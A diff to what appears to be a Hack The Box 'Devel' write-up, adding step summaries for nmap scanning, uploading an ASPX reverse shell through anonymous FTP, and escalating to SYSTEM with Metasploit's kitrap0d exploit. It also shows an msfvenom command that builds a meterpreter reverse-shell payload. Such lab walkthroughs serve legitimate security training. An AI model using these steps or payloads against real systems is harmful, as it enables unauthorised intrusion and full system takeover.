@@ -1,30 +1,34 @@
 # Summary
 ### 1. Another Day, Another NMAP
-x
+We find FTP & HTTP (IIS Server) ports running on the system. Vuln scan shows a vulnerability `MS15-034`.
 
 ### 2. First Attack, MS15-034, CVE-2015-1635
-x
+We find a Metasploit module, `ms15_034_http_sys_memory_dump` and used it, but the result did not contain much valuable information.
 
 ### 3. NMAP, Second Attempt
-x
+We perform another NMAP scan looking for more information, even version numbers. We also probe the HTTP server based on files we saw from the FTP server, `http://10.10.10.5/iisstart.htm` etc which worked.
 
 ### 4. Finding Vulnerabilties for FTP & IIS
-x
+Our NMAP scan revealed `Anonymous FTP login allowed (FTP code 230)` on Port 21, and with a metasploit auxilary scanner we see that everybody has read/write permissions. We can upload a reverse shell that's supported by IIS.
 
 ### 5. Reverse Shell Execution
-x
+We try uploading and executing various reverse shells, first in PHP which failed, then a ASPX reverse shell. We are able to execute the ASPX reverse shell and get a connection on our Kali machine.
 
 ### 6. Privilege Escalation Failed Attempts
-x
+This part was a headache, you can ignore this section. I basically tried elevating the regular shell into something more powerful, like meterpreter or simply perform privilege exections which failed. We also upload `winPEAS` tool to enumerate the system to find for weak spots for privilege escalation. Although `winPEAS` tool was successfully ran, I failed to find something to work from.
 
 ### 7. Fixing Errors and Getting Meterpreter for Privilege Escalation!
-x
+It was at this time I realised I had made configuration errors, my metasploit `exploit/multi/handler` was configured wrongly and the handler could not identify that it was a windows shell, and instead classified it as a generic shell.
+
+Fixing the `exploit/multi/handler` with the correct `windows/shell/reverse_tcp` payload, we get a positive identification on the shell and finally able to convert this shell into a meterpreter shell through a metasploit module which we tried earlier, `post/multi/manage/shell_to_meterpreter`.
 
 ### 8. Privilege Escalation
-x
+Upon getting a meterpreter shell, we try `getsystem` which failed. We run a `post/multi/recon/local_exploit_suggester`, and tried one of the exploits, `exploit/windows/local/ms10_015_kitrap0d`. 
+
+It didn't work on the first time because the meterpreter shell we were trying to escalate privileges on was on a directory without write permissions. We had to change to another directory with write permissions, in this case `%temp`. We run the `ms10_015_kitrap0d` exploit again after changing directory, and successfully got a `AUTHORITY\SYSTEM` meterpreter shell.
 
 ### 9. Alternative Reverse Shell, with Meterpreter & MSFVenom
-x
+This is a slightly shorter and alternative method of #5, where we can use msfvenom to construct a ASPX meterpreter reverse shell, and upon executing this payload on the target, we immediately get a meterpreter shell.
 
 # Attack
 ## 1. Another Day, Another NMAP
@@ -547,7 +551,7 @@ Server username: NT AUTHORITY\SYSTEM
 ## 9. Alternative Reverse Shell, with Meterpreter & MSFVenom
 NOTE: THIS IS AN ALTERNATE METHOD AS SHOWN IN OFFICIAL WRITE-UP
 
-Let's generate a custom `.aspx` reverse shell. [Source](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
+Let's generate a custom `.aspx` reverse shell. [(Source)](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
 ```
 msf5 > msfvenom -p .indows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
 [*] exec: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
